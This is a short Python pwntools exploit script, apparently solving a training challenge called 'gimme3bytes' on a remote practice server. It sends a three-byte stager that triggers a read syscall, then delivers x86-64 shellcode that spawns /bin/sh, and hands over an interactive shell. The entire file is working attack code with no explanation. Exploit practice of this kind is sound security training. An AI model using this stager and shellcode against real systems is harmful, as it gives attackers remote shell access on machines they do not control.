from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
#p = process("./gimme3bytes")
p = remote("training.jinblack.it", 2004)
#gdb.attach(p, '''b *0x00000000004011e8''')
#context.log_level = 'debug'

raw_input("Wait")

#address = 0x401050
#address = 0x405018
#address = 0x4011e3
address = 0x00404028
jump = "\xE9\x88\x00\x00\x00" 
ret = "\xC3"
syscall = "\x5A\x0F\x05"

#p.send(p64(address))
p.send(syscall)
time.sleep(0.1)

shellcode = "\x00\x00\x00\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

p.send(shellcode)

p.interactive()